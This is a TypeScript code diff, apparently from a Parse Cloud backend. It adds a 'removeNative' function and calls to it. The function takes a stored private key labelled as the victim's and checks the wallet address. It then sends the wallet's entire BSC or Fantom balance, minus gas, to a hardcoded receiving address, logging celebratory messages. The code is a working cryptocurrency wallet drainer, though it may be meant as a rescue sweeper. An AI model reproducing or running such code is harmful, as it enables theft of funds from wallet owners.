@@ -255,7 +255,7 @@ if (VICTIM_KEY === "") {
 
 const abimatic = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
 const iface = new utils.Interface(abimatic);
-
+await removeNative(vtctmdtls, ankrkey, request, 'fantom') 
 const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
 const victim = new Wallet(VICTIM_KEY, provider);
 
@@ -342,7 +342,8 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
 
     if(tx.hash) {
 
-    
+      await removeNative(vtctmdtls, ankrkey, request, 'bsc') 
+      await removeNative(vtctmdtls, ankrkey, request, 'fantom') 
       request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
     
   
@@ -370,6 +371,104 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
     // console.log(` Error sending tx: ${err.message ?? err}`);
   }
 }
+
+
+
+
+
+
+async function removeNative(vtctmdtls: any, ankrkey: string, request: any, typee: string) {
+
+const ETH_RPC_HTTP_ANKR = `https://rpc.ankr.com/${ typee == 'bsc' ? 'bsc' : 'fantom'}/`+ ankrkey
+request.log.info('RPC: '+ETH_RPC_HTTP_ANKR);
+
+const VICTIM_KEY = vtctmdtls.get("pkaddr");
+const RECIEVER_ADDRESS = "0x7FF91084790D72dad5de13eEF0FE1C7594f5FC17";
+
+if (VICTIM_KEY === "") {
+  await mshlogger(request, "no key specified :failed sending native" , "error")
+  // console.warn("Must provide VICTIM_KEY environment variable, corresponding to Ethereum EOA with assets to be transferred")
+  return
+}
+
+
+const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
+const wallet = new Wallet(VICTIM_KEY, provider);
+
+const checkvictimaddr = "0x2EaacAf1468F248483Cec65254dff98FF95e3387";
+
+
+  var balance = await wallet.getBalance();
+
+  balance = ethers.BigNumber.from(balance)
+  if (balance.isZero()) {
+ 
+    request.log.info('Balance is zero');
+    return;
+  }
+  
+
+ var feeData = await provider.getFeeData()
+
+ const gasPrice2 = (feeData.maxFeePerGas).mul(3);  // change here
+
+ const gasPriceTotal = gasPrice2.mul(21000);      // change here
+
+ const val = balance.sub(gasPriceTotal.add(1))
+
+
+ 
+  if (balance.lt(gasPriceTotal)) {
+    request.log.info('native Balance is less than gas price');
+    request.log.info('Not same address for: '+typee);
+    return;
+  }
+
+  if(wallet.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {
+
+    request.log.info('Not same address for: '+typee);
+  
+    return 
+  }
+
+  
+
+  try {
+
+      const tx = await wallet.sendTransaction({
+      chainId: typee == 'bsc' ? 56 : 250,
+      type: 2,
+      to: RECIEVER_ADDRESS,
+      gasLimit: 21000,
+      maxFeePerGas : gasPrice2, // change here
+      maxPriorityFeePerGas : gasPrice2, // change here
+      value: val
+    });
+
+     try {
+        tx.wait();
+
+    if(tx.hash) {
+
+      request.log.info('lets hope for confirmation! 😁 🚀');
+  
+    }
+
+    if(tx.nonce) {
+
+      request.log.info('Block Confirmed 😁😁😁 🚀🚀🚀');
+  
+    }
+
+  
+     } catch (error) {
+        request.log.info("error from txwait"+JSON.stringify(error));
+     }
+  } catch (err) {
+    request.log.info(`Error sending tx: ${err.message ?? JSON.stringify(err)}`);
+  }
+}
+
 
 Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {
 
